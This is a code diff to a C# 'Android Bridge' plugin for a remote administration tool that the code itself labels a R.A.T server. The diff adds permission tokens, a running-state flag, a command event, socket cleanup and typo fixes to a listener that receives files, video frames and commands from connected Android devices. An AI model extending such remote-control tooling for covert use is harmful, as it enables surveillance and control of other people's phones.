@@ -2,7 +2,7 @@
 using System.Collections.Generic;
 using System.Text;
 using sCore;
-using sCore.Intergration;
+using sCore.Integration;
 using sCore.RAT;
 using sCore.IO;
 using System.Windows.Forms;
@@ -71,6 +71,7 @@ namespace AndroidExtension
         /// Video frame received event
         /// </summary>
         public event Action<byte[]> VideoReceived;
+        public event Action<string> CommandReceived;
 
         //Define the program variables
 
@@ -81,7 +82,7 @@ namespace AndroidExtension
         /// <summary>
         /// The connected clients list
         /// </summary>
-        private List<Socket> clientList = new List<Socket>();
+        private List<Socket> clientList;
         /// <summary>
         /// The current, controlled client
         /// </summary>
@@ -134,6 +135,11 @@ namespace AndroidExtension
         /// The path of the file to upload
         /// </summary>
         public string ulFilePath = "";
+        /// <summary>
+        /// The token for plugin API access
+        /// </summary>
+        internal string pluginToken = "";
+        internal bool isRunning = false;
 
 #endregion
 
@@ -221,7 +227,7 @@ namespace AndroidExtension
 
         public void Main()
         {
-            Integrate.SetPlugin(this); //Integrate the plugin
+            pluginToken = Integrate.SetPlugin(this, pluginToken); //Integrate the plugin
             Integrate.StartPluginThread(new MainFunction(PluginMain)); //Create a new theread
             invoker = sCore.UI.CommonControls.mainTabControl.Parent; //Get the R.A.T Server Form
         }
@@ -233,16 +239,31 @@ namespace AndroidExtension
         public void PluginMain()
         {
             //Get the application port for the server
-            int appPort = default(int);
-            Types.InputBoxValue result = ServerSettings.ShowInputBox("Android Bridge", "Please enter a port for the android listener to run on");
-            if (result.dialogResult != DialogResult.OK) return;
-            ui = new AndroidUI(this);
-            Invoke(() => ui.Show());
-            appPort = int.Parse(result.result);
-            serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //Create the socket server
-            serverSocket.Bind(new IPEndPoint(IPAddress.Any, appPort)); //Bind the server to any interface and the selected port number
-            serverSocket.Listen(5); //begin listen max. 5 pending connections
-            serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null); //begin accepting clients
+            if (!isRunning) //Application starting the first time
+            {
+                clientList = new List<Socket>();
+                int appPort = default(int);
+                Types.InputBoxValue result = new Types.InputBoxValue { dialogResult = DialogResult.OK, result = "" };
+                if (Integrate.CheckPermission(Permissions.Display, pluginToken)) result = ServerSettings.ShowInputBox("Android Bridge", "Please enter a port for the android listener to run on", pluginToken);
+                if (result.dialogResult != DialogResult.OK)
+                {
+                    Console.WriteLine("Port not set or display permission is denied");
+                    return;
+                }
+                ui = new AndroidUI(this);
+                Invoke(() => ui.Show());
+                appPort = int.Parse(result.result);
+                serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //Create the socket server
+                serverSocket.Bind(new IPEndPoint(IPAddress.Any, appPort)); //Bind the server to any interface and the selected port number
+                serverSocket.Listen(50000); //begin listen max. 50000 pending connections
+                serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null); //begin accepting clients 
+                isRunning = true; //Set the application to running state
+            }
+            else //Application running in the background
+            {
+                ui = new AndroidUI(this);
+                Invoke(() => ui.Show());
+            }
         }
 
         /// <summary>
@@ -290,7 +311,14 @@ namespace AndroidExtension
                 Console.WriteLine("Failed to accept client\r\nError: " + ex.Message);
             }
 
-            serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null); //Restart accepting clients
+            try
+            {
+                serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null); //Restart accepting clients
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Failed to accpet client (can be caused by closing the application), Reason: " + ex.ToString());
+            }
         }
 
         /// <summary>
@@ -325,7 +353,7 @@ namespace AndroidExtension
                 {
                     if (File.Exists(dlFilePath)) //If file created
                     {
-                        using (FileStream fs = new FileStream(dlFilePath, FileMode.Append, FileAccess.Write)) //Oepn the file for writing and append
+                        using (FileStream fs = new FileStream(dlFilePath, FileMode.Append, FileAccess.Write)) //Open the file for writing and append
                         {
                             fs.Write(recv, 0, readBytes); //Write file bytes
                             dlCurrentLength += readBytes; //Increment the bytes written count
@@ -372,7 +400,7 @@ namespace AndroidExtension
                             Array.Copy(recv, md.dataStore, readBytes); //Copy the received bytes to the store
                             Console.WriteLine("First Data Store: " + readBytes + " bytes");
                         }
-                        else //Not first stroing
+                        else //Not first storing
                         {
                             //Save the data store in a temp buffer
                             byte[] tempbytes = new byte[md.dataStoreCount - readBytes];
@@ -430,6 +458,7 @@ namespace AndroidExtension
                             message = message.Substring(9); //Remove the length header
                             message = Encoding.UTF8.GetString(Convert.FromBase64String(message));
                             Console.WriteLine("Message Received: " + message);
+                            CommandReceived?.Invoke(message);
 
                             if (message == "dclient") //Client going to die
                             {
@@ -730,7 +759,7 @@ namespace AndroidExtension
                                     {
                                         name = "File Upload",
                                         success = false,
-                                        message = "Failed to start file upload, "
+                                        message = "Failed to start file upload"
                                     };
                                     Invoke(() => FileOperationResult?.Invoke(fop));
                                 }
@@ -897,8 +926,8 @@ namespace AndroidExtension
 
         private void CloseAll()
         {
-            serverSocket.Shutdown(SocketShutdown.Both);
-            serverSocket.Disconnect(false);
+            if (serverSocket.Connected) serverSocket.Shutdown(SocketShutdown.Both);
+            if (serverSocket.Connected) serverSocket.Disconnect(false);
             serverSocket.Close();
             serverSocket.Dispose();
             serverSocket = null;
@@ -912,7 +941,12 @@ namespace AndroidExtension
 
         public void OnExit()
         {
+            isRunning = false;
             CloseAll();
+            ui.UnloadAPI();
+            ui.Close();
+            ui.Dispose();
+            ui = null;
         }
 #endregion
     }
